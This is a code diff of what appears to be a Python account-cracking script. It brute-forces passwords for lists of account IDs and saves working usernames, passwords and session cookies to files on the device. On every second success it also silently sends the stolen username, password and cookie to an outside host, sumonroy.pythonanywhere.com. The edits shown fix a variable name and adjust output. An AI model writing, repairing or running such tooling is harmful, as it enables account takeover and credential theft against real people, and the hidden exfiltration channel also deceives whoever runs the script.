@@ -121,7 +121,7 @@ def crack(uid, pww, total_idz):
     global cps
     global bkas
     x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
+    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)}")
     sys.stdout.flush()
     try:
         for pw in pww:
@@ -192,20 +192,20 @@ def crack(uid, pww, total_idz):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                        print('\033[1;92m [CRACK-OK] '+user+' | '+pw+'')
                         print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                         oks.append(ids)
                         break
                     else:
                         bkas.append(user)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{user}|{pas}|{kuki}")
+                           statusok = (f"{user}|{pw}|{kuki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                           print('\033[1;92m [CRACK-OK] '+user+' | '+pw+'')
                            print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
-                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                            oks.append(ids)
                            break
                 else:
@@ -215,14 +215,14 @@ def crack(uid, pww, total_idz):
                 cid = coki[24:39]
                 #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
                 open('/sdcard/CRACK/CP.txt', 'a').write( ids+' | '+pas+'\n')
-                cps.append(ids)
+                cps.append(cid)
                 break
             else:continue
         loop+=1
     except requests.exceptions.ConnectionError:
         time.sleep(20)
     except Exception as e:
-        print(f"\nError: {e}")
+        print(f"\nError: {e}");os.system("clear")
         pass
 menu()
  
